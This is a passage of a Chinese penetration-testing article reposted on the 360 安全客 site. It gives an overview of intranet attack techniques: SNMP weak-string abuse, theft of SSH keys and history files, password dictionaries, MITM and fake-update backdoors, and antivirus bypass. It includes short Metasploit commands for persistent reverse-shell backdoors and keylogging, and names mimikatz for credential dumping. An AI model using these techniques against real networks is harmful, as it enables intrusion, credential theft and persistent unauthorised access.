YaHei&#39;;">中就是获取了cisco路由的privilege15权限，得到了内网结构，进一步进行跨vlan攻击）</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">多尝试交换机snmp弱口令，一旦成功，内网结构清晰</span></strong></span></p></li><li><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">关于snmp渗透</span></strong></p><p style="text-indent: 2em; text-align: left;"><a href="http://drops.wooyun.org/tips/baike.baidu.com/view/2899.htm" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">什么是snmp</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用了snmp管理的设备，只需要community string即可，所以针对这个string爆破或者社工都是可行的，默认public/private</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先进行161端口扫描，发现snmp开放情况，通过弱口令查看设备信息，在oid中读取设备密码</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">例子：</span><a href="http://www.wooyun.org/bugs/wooyun-2013-021964" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">中国移动集团华为三层交换SNMP漏洞，可获取管理帐号密码，已成功登录</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以通过这个nmap和msf脚本进行自动攻击</span><a href="https://github.com/grutz/h3c-pt-tools" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">h3c-pt-tools</span></a></p></li><li><p style="text-align: center;"><img src="http://p9.qhimg.com/t0135eb4f415da9db7b.jpg" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">尝试从主机的用户目录或者管理运维邮箱寻找敏感信息(某次渗透即是keylogger运维后在测试机桌面获取到拓扑和网段)</span></p><p style="text-indent: 2em; text-align: left;"><br/></p></li><li><p style="text-align: center;"><img src="http://p7.qhimg.com/t01bb0fc21d3b6618bc.jpg" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过resolv.conf找到内网dns服务器，或者字典穷举dns</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注意分析用户的.bash_history，一般可以分析出用户的使用习惯，纪录等,获取~/.shh/，尝试配合history的连接纪录直接通过密钥登陆其他机器</span></p></li></ul><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x03 内网渗透的常见攻击技巧</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><ul style="padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);" class=" list-paddingleft-2"><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过之前的信息收集和探测，判断出主要的业务机器，如OA，dbserver，利用ssh信任，连入机器后导出员工的userlist，做成针对性的字典，大部分内网的安全性都是脆弱的，且最容易出问题的就是口令安全（大公司也不例外）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">%username%1</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">%username%12</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">%username%123</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">%username%1234</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">%username%12345</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">%username%123456</span></p></li></ul><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">主要对ssh,dbserver,vnc,ftp进行爆破</span></p><p style="text-align: center;"><img src="http://p8.qhimg.com/t01c766fb1342b3818f.png" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p><ul style="padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);" class=" list-paddingleft-2"><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对开了web service的server进行常规渗透，有可以减少工作量的办法就是先对机器批量识别banner，通过banner判断出cms或中间件，直接利用exp</span></p></li><li><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">中间人攻击</span></strong></p></li></ul><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">常用ettercap，不建议做arp的mitm，可以尝试dhcp mitm或者icmp mitm</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">也可以猥琐一点，劫持插件，攻击网关，或者利用evilgrade去伪造软件更新(如notepad++)，然后捆绑上后门，直接打下工作机器，进入办公网</span></p><p style="text-align: center;"><img src="http://p5.qhimg.com/t013bce2d47bc17d5a1.png" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p><p style="text-align: center;"><img src="http://p2.qhimg.com/t015ce413dce701d5e7.png" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">简单配置后用msf生成后门，start即可配合ettercap使用伪造软件更新了</span></p><p style="text-align: center;"><img src="http://p9.qhimg.com/t01aa23b06fac0e81cc.png" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p><ul style="padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);" class=" list-paddingleft-2"><li><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">常见服务漏洞攻击</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">smb/ms08067/ipc$/NetBIOS…………</span></p></li></ul><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是在针对这些比较古老的漏洞攻击时，很可能有AV拦截，所以在不同场景遇到的坑都不一样</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">比如之前在西电DM牛告诉我，有AV，如果直接利用psexec返回会话，即会拦截，这时就可以利用powershell来bypass AV</span><a href="http://drops.wooyun.org/tips/3353" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Powershell tricks::Bypass AV</span></a></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x04 后渗透准备和扩大战果</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">一次完美的内网渗透肯定不是能够一次性完成的，因为整个过程需要管理员的&quot;配合&quot;（口胡。。。）所以后渗透准备时很有必要的</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 后门准备</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">msf的后门已经不错，只需要稍加改造就能很好满足我们的需求</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">普通msfpayload生成的后门不是持续性的，不利于我们下次继续工作，所以需要一个持续性后门</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">msf的持续性后门有两种，通过服务启动(metsvc)和通过启动项启动(persistence)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过服务的后门有个弊端，服务名称是meterpreter，利用方式是： 上传后门，通过metsvc安装服务</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;run&nbsp;metsvc
...(设定端口，并且上传后门文件)
use&nbsp;exploit/multi/handler
set&nbsp;PAYLOAD&nbsp;windows/metsvc_bind_tcp
exploit</pre><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;run&nbsp;persistence&nbsp;-X&nbsp;-i&nbsp;10&nbsp;-p&nbsp;port&nbsp;-r&nbsp;hostip
use&nbsp;multi/handler
set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp
exploit</pre><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然，直接生成的后门有可能会被杀，所以这里我推荐一个很不错的工具，</span><a href="https://github.com/ChrisTruncer/Veil" style="text-indent: 2em; font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">veil</a><span style="text-indent: 2em; font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">，之前再一次小型apt中用这个生成了的后门直接bypass了360</span><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过启动项的利用方式：</span><br/></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">linux下有两个常用的后门</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">mafix rookit和Cymothoa，后者听说可以克隆root用户，不过大部分的backdoor基本都相当于一个加密nc，会新开端口，所以如果webshell存活，可以直接考虑用webshell维持权限</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 键盘记录</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">keylogger在内网渗透过程中（尤其是比较大的内网），起到很关键的作用，因为搞定一个密码，有可能就搞定了一个网段</span></p><p style="text-indent: 2em; text-align: left;"><a href="https://github.com/dorneanu/ixkeylog/" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ixkeylog</span></a><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">是我常用的一个，linux&gt;=2.63均可使用</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">或者使用meterpreter会话的自带键盘记录功能</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p><br/></p><pre class="brush:bash;toolbar:false">keyscan_start
keyscan_dump</pre><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-align: center;"><img src="http://p9.qhimg.com/t01919c876c2ae2782f.png" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p><p style="text-align: center;"><img src="http://p5.qhimg.com/t015c61929438060bd0.png" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">用meterpreter有个好处，就是在win中可以做内存注入，不会创建进程</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里说一个小tips，如果觉得keylogger动作大，可以进系统后把一些你需要的管理工具，如navicat，putty，PLSQL，SecureCRT之类全部选成记住密码</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3. hash</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">mimikatz，不用多说，利用meterpreter可以直接load模块</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Quarks PwDump</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">wce</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x05 something else</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">内网渗透涉及的面很广，本文主要说到的是一些很简单的问题和常规的思路</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">尚未谈到的&nbsp;域渗透&nbsp;打印机&nbsp;办公网嗅探&nbsp;入侵日志清理等等</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果有机会，日后慢慢补全</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 redrain@乌云知识库<br/><a class="text-more" href="http://drops.wooyun.org/tips/5234" target="_blank">原文链接：http://drops.wooyun.org/tips/5234</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="内网渗透随想 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="304" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
